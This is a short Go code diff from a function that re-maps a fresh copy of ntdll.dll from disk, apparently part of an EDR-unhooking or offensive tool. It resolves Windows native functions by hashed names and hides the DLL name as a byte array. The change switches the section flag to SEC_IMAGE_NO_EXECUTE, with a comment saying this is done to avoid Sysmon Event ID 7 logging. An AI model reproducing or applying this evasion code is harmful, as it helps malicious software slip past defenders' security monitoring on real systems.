@@ -198,8 +198,9 @@ func ReMapNtdll() (*unNtd, error) {
 	NCS_ptr, _, _ := DiskFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), "747d342b80e4c1c9d4d3dcb4ee2da24dcce27801", str2sha1)
 
 	var handleNtdllSection uintptr
-	//status = NtCreateSection(&handleNtdllSection, STANDARD_RIGHTS_REQUIRED | SECTION_MAP_READ | SECTION_QUERY, NULL, NULL, PAGE_READONLY, SEC_IMAGE, handleNtdllDisk);
-	syscall.Syscall9(uintptr(NCS_ptr), 7, uintptr(unsafe.Pointer(&handleNtdllSection)), uintptr(0x000F0000|0x4|0x1), 0, 0, syscall.PAGE_READONLY, uintptr(0x1000000), hNtdllfile, 0, 0)
+	//use SEC_IMAGE_NO_EXECUTE to avoid Sysmon Event ID 7
+	//status = NtCreateSection(&handleNtdllSection, STANDARD_RIGHTS_REQUIRED | SECTION_MAP_READ | SECTION_QUERY, NULL, NULL, PAGE_READONLY, SEC_IMAGE_NO_EXECUTE, handleNtdllDisk);
+	syscall.Syscall9(uintptr(NCS_ptr), 7, uintptr(unsafe.Pointer(&handleNtdllSection)), uintptr(0x000F0000|0x4|0x1), 0, 0, syscall.PAGE_READONLY, uintptr(0x11000000), hNtdllfile, 0, 0)
 
 	//zwmapviewofsection = da39da04447a22b747ac8e86b4773bbd6ea96f9b
 	ZMVS_ptr, _, _ := DiskFuncPtr(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}), "da39da04447a22b747ac8e86b4773bbd6ea96f9b", str2sha1)
